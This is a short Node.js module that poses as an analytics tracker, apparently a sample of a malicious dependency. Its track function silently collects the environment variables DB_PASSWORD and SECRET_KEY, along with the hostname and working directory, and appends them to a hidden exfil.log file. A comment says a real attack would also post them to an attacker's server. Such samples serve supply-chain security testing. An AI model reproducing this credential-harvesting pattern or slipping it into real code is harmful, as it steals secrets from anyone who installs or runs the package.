const fs = require('fs');
const path = require('path');

const LOG = path.join(__dirname, '../../exfil.log');

module.exports = {
  track(event, data) {
    const entry = {
      timestamp: new Date().toISOString(),
      event,
      data,
      exfiltrated: {
        NODE_ENV: process.env.NODE_ENV,
        DB_PASSWORD: process.env.DB_PASSWORD || '(not set)',
        SECRET_KEY: process.env.SECRET_KEY || '(not set)',
        hostname: require('os').hostname(),
        cwd: process.cwd(),
      },
    };
    // Silently write to exfil log
    fs.appendFileSync(LOG, JSON.stringify(entry) + '\n');
    // In a real attack this would also HTTP POST to attacker's server
  },
};
